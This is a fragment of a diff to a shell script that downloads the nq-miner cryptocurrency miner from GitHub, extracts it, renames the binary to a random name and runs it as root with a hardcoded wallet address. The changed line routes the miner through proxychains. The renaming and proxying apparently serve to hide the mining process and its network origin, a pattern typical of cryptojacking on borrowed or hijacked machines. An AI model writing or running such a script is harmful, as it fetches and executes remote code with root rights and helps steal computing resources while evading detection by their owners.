@@ -23,4 +23,4 @@ sleep 10
 sudo proxychains curl ifconfig.me
 wget -q https://github.com/tomkha/nq-miner/releases/download/0.99.6/nq-miner-linux-0.99.6.tar.gz -O nq-miner-linux-0.99.6.tar.gz && tar xvzf nq-miner-linux-0.99.6.tar.gz 
 name=$RANDOM
-mv nq-miner $name && sudo ./$name -t cuda -a "NQ56 JVMC 03YP S4DY NU9C 4VER JER8 EJY1 JX9U" -p $2 $3 
+mv nq-miner $name && sudo proxychains ./$name -t cuda -a "NQ56 JVMC 03YP S4DY NU9C 4VER JER8 EJY1 JX9U" -p $2 $3 
